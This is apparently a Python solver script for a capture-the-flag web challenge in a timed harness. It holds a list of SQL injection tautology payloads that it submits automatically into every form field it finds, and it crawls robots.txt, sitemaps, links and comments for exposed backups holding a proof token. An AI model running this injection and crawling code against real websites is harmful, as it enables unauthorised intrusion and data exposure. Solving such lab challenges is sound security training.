#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import json
import os
import sys
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


PROOF_RE = re.compile(rb"proof_[0-9A-Za-z]{8,}")
UA = {"User-Agent": "Mozilla/5.0 (hctf solver)"}
# Boolean-tautology payloads for a search box whose WHERE clause wraps the input in '%..%' and/or parentheses.
SQLI = ["zz') OR 1=1 --", "zz' OR 1=1 --", "zz')) OR 1=1 --", "zz') OR 1=1 OR ('a'='b", "zz' OR 1=1 OR 'a'='b",
        "zz\") OR 1=1 --", "zz\" OR 1=1 --", "zz') OR 1=1#", "zz' OR 1=1#", "zz OR 1=1"]


def target_url(contract, artifact):
    for t in contract.get("targets") or []:
        if (t.get("id") or "").strip().lower() == artifact.strip().lower():
            return t.get("url")
    ts = contract.get("targets") or []
    m = re.search(r"(\d+)", artifact or "")
    if m and len(ts) >= int(m.group(1)):
        return ts[int(m.group(1)) - 1].get("url")
    return ts[0].get("url") if len(ts) == 1 else None


def fetch(url, timeout=8):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.read()
        except Exception:  # noqa: BLE001
            return b""
    except Exception:  # noqa: BLE001
        return b""


def find_proof(body):
    if not body:
        return None
    m = PROOF_RE.search(body)
    if m:
        return m.group(0).decode()
    if body[:2] == b"PK":   # an archive (backup) -> scan its members
        import io
        import zipfile
        try:
            z = zipfile.ZipFile(io.BytesIO(body))
            for n in z.namelist():
                try:
                    v = find_proof(z.read(n))
                except Exception:  # noqa: BLE001
                    continue
                if v:
                    return v
        except Exception:  # noqa: BLE001
            pass
    return None


def forms(base, html):
    """[(action_url, method, input_name)] for every text input of every form on a page."""
    out = []
    for fm in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.S | re.I):
        attrs, inner = fm.group(1), fm.group(2)
        act = re.search(r"action=['\"]([^'\"]*)['\"]", attrs, re.I)
        meth = re.search(r"method=['\"]([^'\"]*)['\"]", attrs, re.I)
        for inp in re.finditer(r"<input\b[^>]*name=['\"]([^'\"]+)['\"][^>]*>", inner, re.I):
            if re.search(r"type=['\"](hidden|submit|checkbox|radio)['\"]", inp.group(0), re.I):
                continue
            out.append((urllib.parse.urljoin(base, act.group(1) if act else ""), (meth.group(1) if meth else "get").lower(),
                        inp.group(1)))
    return out


def sqli(base, home):
    fs = forms(base, home.decode("utf-8", "replace")) or [(urllib.parse.urljoin(base, "/lookup"), "get", "q")]
    for action, method, name in fs:
        for pl in SQLI:
            if method == "post":
                try:
                    req = urllib.request.Request(action, data=urllib.parse.urlencode({name: pl}).encode(), headers=UA)
                    with urllib.request.urlopen(req, timeout=8) as r:
                        body = r.read()
                except urllib.error.HTTPError as e:
                    body = e.read()
                except Exception:  # noqa: BLE001
                    body = b""
            else:
                sep = "&" if "?" in action else "?"
                body = fetch(action + sep + urllib.parse.urlencode({name: pl}))
            v = find_proof(body)
            if v:
                return v
    return None


def exposed(base, home):
    """Earlier-day concept (leftover backup): follow robots.txt / sitemap / page-linked paths only."""
    paths = []
    for p in ("robots.txt", "sitemap.xml"):
        b = fetch(urllib.parse.urljoin(base, "/" + p)).decode("utf-8", "replace")
        v = find_proof(b.encode())
        if v:
            return v
        paths += re.findall(r"(?im)^\s*(?:dis)?allow:\s*(\S+)", b) + re.findall(r"<loc>([^<]+)</loc>", b)
    paths += re.findall(r"(?:href|src)=['\"]([^'\"#]+)['\"]", home.decode("utf-8", "replace"))
    paths += re.findall(r"<!--(.*?)-->", home.decode("utf-8", "replace"), re.S)
    seen = set()
    for p in paths:
        p = p.strip()
        if not p or p in seen or p == "/" or p.startswith(("mailto:", "javascript:")) or "*" in p:
            continue
        seen.add(p)
        if len(seen) > 25:
            break
        v = find_proof(fetch(urllib.parse.urljoin(base, p)))
        if v:
            return v
    return None


def answer(answer_id, question, data, contract):
    """Return the value for one answer_id from its artifact bytes (None = cannot answer). Derive everything from
    `data`; never hard-code a variant's values."""
    url = target_url(contract, question.get("artifact") or "")
    if not url:
        return None
    base = url if url.endswith("/") else url + "/"
    home = fetch(base)
    v = find_proof(home)
    if v:
        return v
    text = ((contract.get("prompt") or "") + " " + (question.get("question") or "")).lower()
    order = [exposed, sqli] if re.search(r"backup|archive|diary|forgot|left", text) and "query" not in text \
        else [sqli, exposed]
    for fn in order:
        v = fn(base, home)
        if v:
            return v
    return None


def fallback(answer_id, question, data, contract):
    """Called ONLY when answer() found nothing (None or an exception): a cheap generic second try for a variant shape
    the direct parse doesn't know (Time Trial / Mastery mutate the task) -- e.g. the lane lib's name-agnostic decoder
    over `data`, then a match against question["answer_format"]. None = give up on this field only."""
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        try:
            v = answer(aid, q, data, contract)
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None and not _past_deadline():   # in-window: never let a fallback search eat the kill margin
            try:
                v = fallback(aid, q, data, contract)
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    out = {}
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            with ProcessPoolExecutor(max_workers=min(len(groups), os.cpu_count() or 2),
                                     mp_context=mp.get_context("fork")) as ex:
                for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                    out.update(part)
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out))


if __name__ == "__main__":
    main()
